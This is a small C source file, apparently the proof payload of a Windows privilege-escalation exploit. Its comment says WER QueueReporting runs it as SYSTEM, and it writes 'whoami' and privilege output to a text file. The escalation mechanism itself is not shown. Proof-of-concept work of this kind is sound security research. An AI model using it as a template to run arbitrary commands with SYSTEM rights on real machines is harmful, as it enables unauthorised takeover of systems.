/*
 * payload_exe.c - SYSTEM proof EXE (run by WER QueueReporting as SYSTEM)
 * Writes whoami output to C:\Temp\SYSTEM_PROOF.txt
 */
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

int main(void) {
    wchar_t user[128] = {0}; DWORD ul = 128;
    GetUserNameW(user, &ul);

    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESTDHANDLES;

    /* open output file */
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hf = CreateFileW(L"C:\\Temp\\SYSTEM_PROOF.txt",
        GENERIC_WRITE, FILE_SHARE_READ, &sa,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    si.hStdOutput = si.hStdError = hf;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    wchar_t cmd[] = L"cmd.exe /C echo SYSTEM PROOF && whoami && whoami /priv";
    CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    if (hf != INVALID_HANDLE_VALUE) CloseHandle(hf);
    return 0;
}
